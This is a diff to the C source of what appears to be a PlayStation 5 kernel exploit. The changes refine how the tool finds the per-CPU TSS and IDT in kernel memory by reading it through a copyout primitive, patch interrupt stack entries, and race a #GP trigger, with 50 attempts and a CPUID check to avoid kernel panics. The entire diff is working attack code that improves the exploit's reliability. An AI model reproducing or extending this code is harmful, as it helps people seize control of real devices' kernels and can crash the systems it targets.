@@ -54,6 +54,7 @@ along with this program; see the file COPYING. If not, see
 #include <threads.h>
 #include <ucontext.h>
 #include <sys/cpuset.h>
+#include <sys/sched.h>
 #include <pthread.h>
 #include <pthread_np.h>
 
@@ -2869,6 +2870,22 @@ cmd_dump_idt(int sock)
  * from the signal context's mc_rip.
  */
 
+/*
+ * get_current_cpu_apicid - Read the initial APIC ID via CPUID.
+ *
+ * Returns the APIC ID of the CPU this thread is currently running on.
+ * On a 2-CPU PS5, CPU 0 typically has APIC ID 0.  We use this as a
+ * "soft pin": before triggering the dangerous #GP, check that we're
+ * on a CPU whose TSS we've patched.  If not, yield and retry.
+ */
+static inline int
+get_current_cpu_apicid(void)
+{
+    unsigned int regs[4];
+    do_cpuid(1, regs);
+    return (regs[1] >> 24) & 0xFF;
+}
+
 /* Signal handler for #GP trap frame method (catches SIGBUS and SIGSEGV) */
 static void
 gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
@@ -3022,32 +3039,52 @@ find_tss_in_kdata(int sock, int *stride_out)
             if (!ist_ok)
                 continue;
 
-            /* Confirm: look for a second TSS at +104 or further (per-CPU) */
+            /* Confirm: look for a second TSS at +104 or further (per-CPU).
+             *
+             * IMPORTANT: We do FULL TSS validation on the stride candidate,
+             * not just rsvd0+rsp0.  A weak check here causes false strides
+             * (e.g., stride=200 on PS5 matches random data that happens to
+             * have rsvd0=0 and a plausible rsp0, but rsvd64=0xffffffff).
+             * False strides mean we only find 1 "valid" CPU when there are
+             * more, leaving unpatched CPUs that triple-fault on #GP. */
             uint64_t tss_va = kdata_base + off + i;
             int found_second = 0;
 
             /* TSS entries might be 104 bytes apart, or padded to 128/256 */
             for (int stride = 104; stride <= 4096; stride += 8) {
                 uint64_t next_addr = tss_va + stride;
-                uint32_t next_rsvd0;
-                uint64_t next_rsp0;
+                uint8_t next_tss[104];
 
-                if (kernel_copyout(next_addr, &next_rsvd0, 4) != 0)
+                if (kernel_copyout(next_addr, next_tss, sizeof(next_tss)) != 0)
                     continue;
+
+                uint32_t next_rsvd0;
+                uint64_t next_rsp0, next_rsp1, next_rsp2;
+                uint32_t next_rsvd64;
+                memcpy(&next_rsvd0,  next_tss + 0x00, 4);
+                memcpy(&next_rsp0,   next_tss + 0x04, 8);
+                memcpy(&next_rsp1,   next_tss + 0x0C, 8);
+                memcpy(&next_rsp2,   next_tss + 0x14, 8);
+                memcpy(&next_rsvd64, next_tss + 0x64, 4);
+
                 if (next_rsvd0 != 0)
                     continue;
-                if (kernel_copyout(next_addr + 4, &next_rsp0, 8) != 0)
+                if (next_rsp0 == 0 ||
+                    (next_rsp0 < (uint64_t)ktext_base &&
+                     next_rsp0 != 0xFFFFFFFFFFFFFFFFULL))
                     continue;
-                if (next_rsp0 != 0 &&
-                    (next_rsp0 >= (uint64_t)ktext_base ||
-                     next_rsp0 == 0xFFFFFFFFFFFFFFFFULL)) {
-                    found_second = 1;
-                    if (stride_out)
-                        *stride_out = stride;
-                    send_response(sock, "TSS found at 0x%lx (stride=%d to next)\n",
-                                  tss_va, stride);
-                    break;
-                }
+                /* Deep validation: rsp1/rsp2 must be 0, rsvd64 must be 0 */
+                if (next_rsp1 != 0 || next_rsp2 != 0)
+                    continue;
+                if (next_rsvd64 != 0)
+                    continue;
+
+                found_second = 1;
+                if (stride_out)
+                    *stride_out = stride;
+                send_response(sock, "TSS found at 0x%lx (stride=%d to next)\n",
+                              tss_va, stride);
+                break;
             }
 
             if (found_second)
@@ -4364,6 +4401,7 @@ broad_done:
                     }
                     ridt_probed++;
                     int valid = 0;
+                    int ridt_cs_ok = 0;
                     for (int v = 0; v < 4; v++) {
                         uint8_t *g = gates + v * 16;
                         /* Check present bit + gate type */
@@ -4377,6 +4415,10 @@ broad_done:
                         memcpy(&rsvd, g + 12, 4);
                         if (rsvd != 0)
                             continue;
+                        uint16_t gcs;
+                        memcpy(&gcs, g + 2, 2);
+                        if (gcs != 0)
+                            ridt_cs_ok = 1;
                         /* Check handler is kernel address */
                         uint64_t h = (uint64_t)g[0] |
                                      ((uint64_t)g[1] << 8) |
@@ -4390,7 +4432,7 @@ broad_done:
                             valid++;
                     }
 
-                    if (valid >= 3) {
+                    if (valid >= 3 && ridt_cs_ok) {
                         idt_base = base;
                         idt_found = 1;
                         /* Set access address: use DMAP for XOM range */
@@ -4442,6 +4484,7 @@ broad_done:
                          poff + 64 <= 4096 && !idt_found;
                          poff += 16) {
                         int valid = 0;
+                        int any_cs_ok = 0;
                         for (int v = 0; v < 4; v++) {
                             uint8_t *g = page + poff + v * 16;
                             if (!(g[5] & 0x80))
@@ -4453,6 +4496,10 @@ broad_done:
                             memcpy(&rsvd, g + 12, 4);
                             if (rsvd != 0)
                                 continue;
+                            uint16_t gcs;
+                            memcpy(&gcs, g + 2, 2);
+                            if (gcs != 0)
+                                any_cs_ok = 1;
                             uint64_t h = (uint64_t)g[0] |
                                          ((uint64_t)g[1] << 8) |
                                          ((uint64_t)g[6] << 16) |
@@ -4464,7 +4511,7 @@ broad_done:
                             if (h >= 0xFFFF800000000000ULL)
                                 valid++;
                         }
-                        if (valid >= 3) {
+                        if (valid >= 3 && any_cs_ok) {
                             idt_base = addr + poff;
                             idt_access = idt_base; /* in .data — direct */
                             idt_found = 1;
@@ -4527,6 +4574,7 @@ broad_done:
                     phys_pages_read++;
 
                     int valid = 0;
+                    int any_cs_nonzero = 0;
                     for (int v = 0; v < 4; v++) {
                         uint8_t *g = gates + v * 16;
                         if (!(g[5] & 0x80))
@@ -4538,6 +4586,10 @@ broad_done:
                         memcpy(&rsvd, g + 12, 4);
                         if (rsvd != 0)
                             continue;
+                        uint16_t gate_cs;
+                        memcpy(&gate_cs, g + 2, 2);
+                        if (gate_cs != 0)
+                            any_cs_nonzero = 1;
                         uint64_t h = (uint64_t)g[0] |
                             ((uint64_t)g[1] << 8) |
                             ((uint64_t)g[6] << 16) |
@@ -4549,7 +4601,10 @@ broad_done:
                         if (h >= 0xFFFF800000000000ULL)
                             valid++;
                     }
-                    if (valid >= 3) {
+                    /* Require at least one gate with non-zero CS to
+                     * reject false positives (e.g., random data that
+                     * happens to have valid-looking gate structures). */
+                    if (valid >= 3 && any_cs_nonzero) {
                         idt_found = 1;
                         idt_base = dmap_base + pa + 0xc70;
                         idt_access = idt_base;
@@ -4591,6 +4646,7 @@ broad_done:
                              poff + 64 <= 4096 && !idt_found;
                              poff += 16) {
                             int valid = 0;
+                            int any_cs_nz = 0;
                             for (int v = 0; v < 4; v++) {
                                 uint8_t *g = page + poff + v * 16;
                                 if (!(g[5] & 0x80))
@@ -4602,6 +4658,10 @@ broad_done:
                                 memcpy(&rsvd, g + 12, 4);
                                 if (rsvd != 0)
                                     continue;
+                                uint16_t gcs;
+                                memcpy(&gcs, g + 2, 2);
+                                if (gcs != 0)
+                                    any_cs_nz = 1;
                                 uint64_t h = (uint64_t)g[0] |
                                     ((uint64_t)g[1] << 8) |
                                     ((uint64_t)g[6] << 16) |
@@ -4613,7 +4673,7 @@ broad_done:
                                 if (h >= 0xFFFF800000000000ULL)
                                     valid++;
                             }
-                            if (valid >= 3) {
+                            if (valid >= 3 && any_cs_nz) {
                                 idt_found = 1;
                                 idt_base = dmap_base + pa + poff;
                                 idt_access = idt_base;
@@ -4642,7 +4702,7 @@ broad_done:
             }
         }
 
-        /* Read #GP gate (vector 13) */
+        /* Read #GP gate (vector 13) and validate */
         {
             uint8_t gp_gate[16];
             if (kernel_copyout(idt_access + 13 * 16, gp_gate, 16) != 0) {
@@ -4651,6 +4711,8 @@ broad_done:
             }
 
             gp_ist_index = gp_gate[4] & 0x07;
+            uint16_t gp_cs;
+            memcpy(&gp_cs, gp_gate + 2, 2);
             uint64_t gp_handler =
                 (uint64_t)gp_gate[0] |
                 ((uint64_t)gp_gate[1] << 8) |
@@ -4662,8 +4724,26 @@ broad_done:
                 ((uint64_t)gp_gate[11] << 56);
 
             send_response(sock, "  #GP gate: handler=0x%lx IST=%d "
-                          "type=0x%02x\n",
-                          gp_handler, gp_ist_index, gp_gate[5]);
+                          "type=0x%02x CS=0x%04x\n",
+                          gp_handler, gp_ist_index, gp_gate[5], gp_cs);
+
+            /* Validate #GP gate: CS must be non-zero kernel selector,
+             * handler must be a kernel address, and gate must be present.
+             * CS=0 means null selector → this IDT is likely a false match. */
+            if (gp_cs == 0) {
+                send_response(sock, "  ERROR: #GP gate CS=0 (null selector) "
+                              "— IDT is likely a false match\n");
+                goto step7_cleanup;
+            }
+            if (!(gp_gate[5] & 0x80)) {
+                send_response(sock, "  ERROR: #GP gate not present\n");
+                goto step7_cleanup;
+            }
+            if (gp_handler < 0xFFFF800000000000ULL) {
+                send_response(sock, "  ERROR: #GP handler 0x%lx is not "
+                              "a kernel address\n", gp_handler);
+                goto step7_cleanup;
+            }
         }
 
         /* 7c. Allocate IST page */
@@ -4886,7 +4966,19 @@ broad_done:
 
             if (!cpu_pinned) {
                 send_response(sock, "  WARNING: all pinning strategies failed\n");
-                send_response(sock, "  Continuing - all per-CPU TSSes were modified\n");
+                if (num_cpus_found < 2) {
+                    send_response(sock, "  CRITICAL: only %d CPU(s) patched, "
+                                  "pinning failed\n"
+                                  "  Any #GP on an unpatched CPU will "
+                                  "triple-fault → kernel panic.\n"
+                                  "  Will use CPUID-based soft pin "
+                                  "(check CPU before each trigger).\n",
+                                  num_cpus_found);
+                } else {
+                    send_response(sock, "  All %d validated per-CPU TSSes "
+                                  "were modified — proceeding\n",
+                                  num_cpus_found);
+                }
             }
         }
 
@@ -5167,9 +5259,9 @@ broad_done:
 
         send_response(sock, "\n  WARNING: IDT is now live — each attempt risks\n"
                       "  kernel panic if the CS race loses.\n");
-        send_response(sock, "  Starting trigger loop (10 attempts)...\n");
+        send_response(sock, "  Starting trigger loop (50 attempts max)...\n");
         {
-            int max_attempts = 10;
+            int max_attempts = 50;
             gp_trap_attempt_count = 0;
             gp_trap_got_result = 0;
             gp_trap_doreti_addr = 0;
@@ -5241,6 +5333,35 @@ broad_done:
 
                 /* Normal path: getcontext + setcontext */
                 {
+                    /*
+                     * Soft CPU check: if pinning failed and not all CPUs
+                     * have IST patched, verify via CPUID that we're on a
+                     * patched CPU before triggering.  If on the wrong CPU,
+                     * yield the timeslice and retry — don't trigger #GP
+                     * because the unpatched CPU has IST7=0 → RSP=0 →
+                     * triple fault → kernel panic.
+                     *
+                     * Do this BEFORE getcontext so we don't waste trigger
+                     * attempts on CPU-check failures.
+                     */
+                    if (!cpu_pinned && num_cpus_found < GP_TRAP_MAX_CPUS) {
+                        int cpu_retries = 0;
+                        while (cpu_retries < 200) {
+                            int apic_id = get_current_cpu_apicid();
+                            if (apic_id < num_cpus_found)
+                                break; /* on a patched CPU */
+                            sched_yield();
+                            usleep(100);
+                            cpu_retries++;
+                        }
+                        if (cpu_retries >= 200) {
+                            send_response(sock,
+                                "  ERROR: could not get scheduled on "
+                                "patched CPU after 200 yields\n");
+                            break;
+                        }
+                    }
+
                     uint8_t uc_buf[2048] __attribute__((aligned(16)));
                     memset(uc_buf, 0, sizeof(uc_buf));
 
@@ -5271,9 +5392,25 @@ broad_done:
                             0x8000000000000000ULL;
                     }
 
+                    /* Final CPU check right before trigger — there's
+                     * still a small window between this check and
+                     * setcontext, but it's the best we can do. */
+                    int trigger_apic = get_current_cpu_apicid();
+                    if (!cpu_pinned && num_cpus_found < GP_TRAP_MAX_CPUS &&
+                        trigger_apic >= num_cpus_found) {
+                        /* Rescheduled to wrong CPU between check and
+                         * trigger — don't fire, retry */
+                        send_response(sock,
+                            "  attempt %d skipped (CPU APIC=%d is unpatched)\n",
+                            (int)gp_trap_attempt_count, trigger_apic);
+                        usleep(100);
+                        continue;
+                    }
+
                     send_response(sock,
-                        "  attempt %d (non-canonical RIP)...\n",
-                        (int)gp_trap_attempt_count);
+                        "  attempt %d (non-canonical RIP, CPU APIC=%d)...\n",
+                        (int)gp_trap_attempt_count,
+                        trigger_apic);
 
                     /* Activate writer just before trigger —
                      * minimizes window where it can corrupt
